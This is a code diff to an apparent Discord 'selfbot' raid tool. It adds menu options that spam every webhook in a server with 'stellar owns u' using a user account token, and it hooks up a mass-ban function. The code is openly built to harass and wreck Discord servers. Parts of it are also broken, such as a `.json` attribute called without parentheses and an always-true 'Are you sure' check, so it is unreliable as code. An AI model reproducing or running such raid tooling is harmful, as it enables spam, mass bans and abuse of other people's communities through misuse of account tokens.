@@ -31,6 +31,10 @@ def main():
     choice = str(input(f"{white}[{red}END{white}] Choice >>> "))
     if choice in ["01", "1", "one"]:
         selfbot.spamchannels()
+    if choice in ["02", "2", "two"]:
+        selfbot.webhookspam()
+    if choice in ["03", "3", "three"]:
+        selfbot.banall()
 
 class selfbot:
     def banall():
@@ -52,26 +56,30 @@ class selfbot:
                 else:
                     print(f"{red}{banreq.text}")
                     break
+    
 
     def webhookspam():
-        test = input(f"{white}[{red}END{white}] Webhook or SpamChannels: ")
-        if test == "Webhook" or "webhook" or "SpamChannels" or "spamchannels" or "spamchannels":
+        yes = input(f"{white}[{red}END{white}] Are you sure? (Y or N)")
+        if yes == "Y" or yes == "y" or yes == "yes":
             channel_id = input(f"{white}[{red}END{white}] Enter channel ID for webhook: ")
-            i=1
             headers = {
                 "Authorization": token,
                 "Content-Type": "application/json",
             }
+            webhook_ids = "test"
+            guild_id = 1132072878263762994
             real12 = {"name": "stellar owns u"}
-            spam = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", headers=headers, json=real12)
-            if spam.status_code == 201:
-                print(f"{green}[+] Created webhook")
-            else:
-                print(f"{red}[-] Ran into a error and avoiding it")
-                while spam.status_code<201:
-                    spam = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", headers=headers, json=real12)
-                    print(f"{green}[+] Created webhook")
-                    
+            test23 = {"content": "stellar owns u"}
+            test123 = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/webhooks", headers=headers).json
+            urls = test123.content
+            things12 = requests.get(f"https://discord.com/api/guilds/{guild_id}/channels", headers=headers)
+            channels = things12.json()
+            print(channels)
+            for channel in channels:
+                for url in urls:
+                    spam = requests.post(url, headers=headers, json=test23)
+                    print(spam.content)
+
     def spamchannels():
             yes = input(f"{white}[{red}END{white}] Are you sure? (Y or N)")
             if yes == "Y" or "y" or "yes":
